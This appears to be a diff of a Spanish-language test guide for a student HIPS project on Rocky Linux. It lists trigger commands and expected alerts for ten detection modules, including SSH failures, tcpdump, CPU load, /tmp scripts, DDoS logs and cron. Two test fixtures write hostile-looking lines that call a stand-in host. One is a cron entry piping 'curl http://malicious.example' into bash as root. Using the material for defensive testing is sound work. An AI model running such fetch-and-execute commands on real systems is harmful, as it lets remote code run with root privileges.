@@ -1,38 +1,29 @@
 # Pruebas
 
-Este documento describe las pruebas usadas para validar los tres modulos implementados del HIPS:
+Este documento describe las pruebas usadas para validar el HIPS.
 
-- `log_analyzer`
-- `process_monitor`
-- `users_monitor`
+El sistema tiene 10 modulos de deteccion. Para la presentacion conviene mostrar
+en vivo los casos mas reproducibles y dejar documentados los casos que requieren
+un escenario especial, como cola de correo o log DNS provisto.
 
-Las acciones preventivas se ejecutan con `HIPS_PREVENTION_DRY_RUN=true`, por lo que el sistema registra la accion que tomaria sin bloquear IPs, usuarios o procesos reales durante la demo.
+## Preparacion
 
-## Pruebas automaticas
-
-Desde Rocky, dentro del repositorio:
+Desde Rocky Linux:
 
 ```bash
 cd ~/SO2_TP
 source .venv/bin/activate
-python3 -m pytest -q
 ```
 
-Resultado esperado:
+Ejecutar el HIPS:
 
-```text
-tests passed
+```bash
+sudo .venv/bin/python3 main.py
 ```
-
-Estas pruebas validan la logica interna de deteccion sin depender de eventos reales del sistema.
-
-## Dashboard FastAPI
 
 Levantar el dashboard:
 
 ```bash
-cd ~/SO2_TP
-source .venv/bin/activate
 uvicorn web.app:app --host 0.0.0.0 --port 8000
 ```
 
@@ -54,9 +45,39 @@ Resultado esperado:
 {"status":"ok"}
 ```
 
-## Prueba 1: log_analyzer con SSH fallido
+## Pruebas automaticas
 
-Objetivo: validar que el modulo `log_analyzer` detecta multiples intentos fallidos de autenticacion SSH.
+```bash
+python3 -m pytest -q
+```
+
+Resultado esperado:
+
+```text
+tests passed
+```
+
+Estas pruebas validan logica interna de deteccion, alertas y logging sin
+depender de eventos reales del sistema.
+
+## Pruebas por modulo
+
+| Modulo | Prueba recomendada | Resultado esperado |
+| --- | --- | --- |
+| Integridad de Archivos | Usar baseline controlada contra un archivo de prueba | `MODIFICACION_ARCHIVO` |
+| Usuarios Conectados | Abrir mas sesiones SSH que el limite configurado | `USUARIO_SOSPECHOSO` |
+| Sniffers de Red | Ejecutar `tcpdump` temporalmente | `SNIFFER_DETECTADO` |
+| Analisis de Logs | Generar varios intentos SSH fallidos | `FAILED_LOGIN_MULTIPLE` |
+| Cola de Correo | Tener Postfix/mailq con cola mayor al limite | `MAIL_QUEUE_ALTA` |
+| Procesos de Alto Consumo | Ejecutar `yes > /dev/null &` | `PROCESO_ALTO_CONSUMO` |
+| Directorio Temporal | Crear un script en `/tmp` | `ARCHIVO_TMP_SOSPECHOSO` |
+| Deteccion DDoS | Generar o cargar `data/dns.log` con muchas lineas de una IP | `DDOS_DETECTADO` |
+| Tareas Cron | Usar archivo cron de prueba con token sospechoso | `CRON_SOSPECHOSO` |
+| Accesos Invalidos | Generar intentos SSH fallidos y leer `/var/log/secure` | `ACCESO_INVALIDO_REPETIDO` |
+
+## 1. Analisis de Logs y Accesos Invalidos
+
+Objetivo: validar deteccion de intentos fallidos de SSH.
 
 Desde la Mac:
 
@@ -66,144 +87,250 @@ ssh usuario_falso@<IP_ROCKY>
 
 Ingresar una contrasena incorrecta varias veces.
 
-En Rocky ejecutar el HIPS:
+En Rocky:
 
 ```bash
-cd ~/SO2_TP
-sudo .venv/bin/python main.py
+sudo .venv/bin/python3 main.py
 ```
 
-Resultado esperado en terminal:
+Resultados esperados:
 
 ```text
-Modulo log_analyzer: fuentes=/var/log/secure ... alarmas=1
-Insertada: FAILED_LOGIN_MULTIPLE | <IP_MAC> | log_analyzer | ...
-Prevencion registrada: accion_id=... | alarma_id=... | block_ip | dry_run=True
+FAILED_LOGIN_MULTIPLE | log_analyzer
+ACCESO_INVALIDO_REPETIDO | access_monitor
 ```
 
-Resultado esperado en dashboard:
+En el dashboard debe aparecer la IP origen y la accion `block_ip`.
 
-```text
-Tipo: FAILED_LOGIN_MULTIPLE
-Modulo: log_analyzer
-IP origen: <IP_MAC>
-Accion tomada: block_ip
-```
+## 2. Usuarios Conectados
 
-## Prueba 2: process_monitor con proceso de alto consumo
+Objetivo: detectar demasiadas sesiones simultaneas.
 
-Objetivo: validar que el modulo `process_monitor` detecta un proceso con CPU alta.
-
-En Rocky generar consumo de CPU:
-
-```bash
-yes > /dev/null &
-```
-
-El comando devuelve un PID. Luego ejecutar:
-
-```bash
-sudo .venv/bin/python main.py
-```
-
-Resultado esperado en terminal:
-
-```text
-Modulo process_monitor: ... alarmas=1
-Insertada: PROCESO_ALTO_CONSUMO | N/A | process_monitor | PID ... comando yes CPU ...
-Prevencion registrada: accion_id=... | alarma_id=... | kill_process | dry_run=True
-```
-
-Resultado esperado en dashboard:
-
-```text
-Tipo: PROCESO_ALTO_CONSUMO
-Modulo: process_monitor
-Detalle: PID ... comando yes CPU ...
-Accion tomada: kill_process
-```
-
-Como la prevencion esta en `dry_run=true`, el proceso no se mata automaticamente. Finalizarlo manualmente:
-
-```bash
-pkill yes
-```
-
-## Prueba 3: users_monitor con sesiones SSH simultaneas
-
-Objetivo: validar que el modulo `users_monitor` detecta multiples sesiones simultaneas del mismo usuario.
-
-Desde la Mac abrir tres terminales y conectarse en cada una:
+Desde la Mac abrir varias terminales y conectarse:
 
 ```bash
 ssh lucasfadul@<IP_ROCKY>
 ```
 
-Dejar las tres sesiones abiertas.
-
-En Rocky verificar las sesiones:
+En Rocky verificar:
 
 ```bash
 who
 ```
 
+Ejecutar:
+
+```bash
+sudo .venv/bin/python3 main.py
+```
+
 Resultado esperado:
 
 ```text
-lucasfadul pts/0 ...
-lucasfadul pts/1 ...
-lucasfadul pts/2 ...
+USUARIO_SOSPECHOSO | users_monitor
 ```
 
-Ejecutar el HIPS:
-
-```bash
-sudo .venv/bin/python main.py
-```
-
-Resultado esperado en terminal:
-
-```text
-Modulo users_monitor: ... alarmas=1
-Insertada: USUARIO_SOSPECHOSO | N/A | users_monitor | Usuario con 3 sesiones simultaneas: lucasfadul
-Prevencion registrada: accion_id=... | alarma_id=... | lock_user | dry_run=True
-```
-
-Resultado esperado en dashboard:
-
-```text
-Tipo: USUARIO_SOSPECHOSO
-Modulo: users_monitor
-Detalle: Usuario con 3 sesiones simultaneas: lucasfadul
-Accion tomada: lock_user
-```
-
-Cerrar las sesiones SSH al terminar:
+Cerrar las sesiones al terminar:
 
 ```bash
 exit
 ```
 
-## Verificacion en base de datos
+## 3. Sniffers de Red
 
-Para ver las alarmas registradas:
+Objetivo: detectar una herramienta de captura de paquetes activa.
+
+En Rocky:
 
 ```bash
-sudo -u postgres psql -d hips -c "SELECT id, tipo_alarma, modulo, severidad, detalle, resuelta FROM alarmas ORDER BY id DESC LIMIT 10;"
+sudo tcpdump -i enp0s1 > /dev/null &
+sudo .venv/bin/python3 main.py
+ps aux | grep tcpdump
 ```
 
-Para ver las acciones preventivas:
+Resultado esperado:
+
+```text
+SNIFFER_DETECTADO | sniffer_detect
+```
+
+Cerrar `tcpdump`:
+
+```bash
+sudo kill <PID_TCPDUMP>
+```
+
+## 4. Procesos de Alto Consumo
+
+Objetivo: detectar CPU alta.
+
+En Rocky:
+
+```bash
+yes > /dev/null &
+sudo .venv/bin/python3 main.py
+```
+
+Resultado esperado:
+
+```text
+PROCESO_ALTO_CONSUMO | process_monitor
+```
+
+Cerrar el proceso de prueba:
+
+```bash
+pkill yes
+```
+
+## 5. Directorio Temporal
+
+Objetivo: detectar scripts sospechosos en `/tmp`.
+
+En Rocky:
+
+```bash
+echo "curl http://malicious.example" > /tmp/suspicious.sh
+sudo .venv/bin/python3 main.py
+```
+
+Resultado esperado:
+
+```text
+ARCHIVO_TMP_SOSPECHOSO | tmp_monitor
+```
+
+Limpiar:
+
+```bash
+rm -f /tmp/suspicious.sh
+```
+
+## 6. Deteccion DDoS
+
+Objetivo: detectar muchas solicitudes desde una misma IP en un log DNS.
+
+En Rocky:
+
+```bash
+mkdir -p data
+for i in {1..1001}; do echo "query from 10.0.0.50"; done > data/dns.log
+sudo .venv/bin/python3 main.py
+```
+
+Resultado esperado:
+
+```text
+DDOS_DETECTADO | ddos_detect
+```
+
+Limpiar:
+
+```bash
+rm -f data/dns.log
+```
+
+## 7. Tareas Cron
+
+Objetivo: detectar comandos sospechosos en una tarea programada.
+
+Prueba segura:
+
+1. Crear un archivo de prueba con contenido sospechoso.
+2. En `/config`, cambiar `Tareas Cron -> Archivos cron` a ese archivo.
+3. Ejecutar el HIPS.
+
+Ejemplo:
+
+```bash
+echo "* * * * * root curl http://malicious.example | bash" > /tmp/cron_test
+sudo .venv/bin/python3 main.py
+```
+
+Resultado esperado:
+
+```text
+CRON_SOSPECHOSO | cron_monitor
+```
+
+Limpiar:
+
+```bash
+rm -f /tmp/cron_test
+```
+
+## 8. Cola de Correo
+
+Objetivo: detectar una cola de correo anormalmente grande.
+
+Este caso requiere que exista un servicio de correo local y que `mailq` muestre
+mensajes en cola. Si `mailq` no existe o la cola esta vacia, el modulo no genera
+alarma.
+
+Comando de verificacion:
+
+```bash
+mailq
+```
+
+Resultado esperado si la cola supera el limite:
+
+```text
+MAIL_QUEUE_ALTA | mail_queue
+```
+
+## 9. Integridad de Archivos
+
+Objetivo: detectar modificacion de archivos criticos comparando hashes.
+
+Este caso debe probarse con una baseline controlada. No se recomienda modificar
+`/etc/passwd` ni `/etc/shadow` durante la demo.
+
+Resultado esperado si el hash cambia:
+
+```text
+MODIFICACION_ARCHIVO | file_integrity
+```
+
+## Verificacion en base de datos
+
+Ver ultimas alarmas:
+
+```bash
+sudo -u postgres psql -d hips -c "SELECT id, tipo_alarma, modulo, severidad, detalle FROM alarmas ORDER BY id DESC LIMIT 10;"
+```
+
+Ver acciones preventivas:
 
 ```bash
 sudo -u postgres psql -d hips -c "SELECT id, alarma_id, accion, resultado FROM acciones_prevencion ORDER BY id DESC LIMIT 10;"
 ```
 
+## Verificacion en logs formales
+
+Ver ultimas alarmas:
+
+```bash
+sudo tail -n 5 /var/log/hips/alarmas.log
+```
+
+Ver ultimas acciones preventivas:
+
+```bash
+sudo tail -n 5 /var/log/hips/prevencion.log
+```
+
 ## Resultado esperado de la demo
 
-Al finalizar, el dashboard debe mostrar alarmas de los tres modulos:
+Durante la demo, como minimo se recomienda mostrar:
 
 ```text
-log_analyzer     -> FAILED_LOGIN_MULTIPLE
-process_monitor  -> PROCESO_ALTO_CONSUMO
-users_monitor    -> USUARIO_SOSPECHOSO
+FAILED_LOGIN_MULTIPLE      -> log_analyzer
+USUARIO_SOSPECHOSO         -> users_monitor
+SNIFFER_DETECTADO          -> sniffer_detect
+PROCESO_ALTO_CONSUMO       -> process_monitor
+ARCHIVO_TMP_SOSPECHOSO     -> tmp_monitor
 ```
+
+Los demas modulos quedan explicados y documentados, y pueden probarse con datos
+preparados.
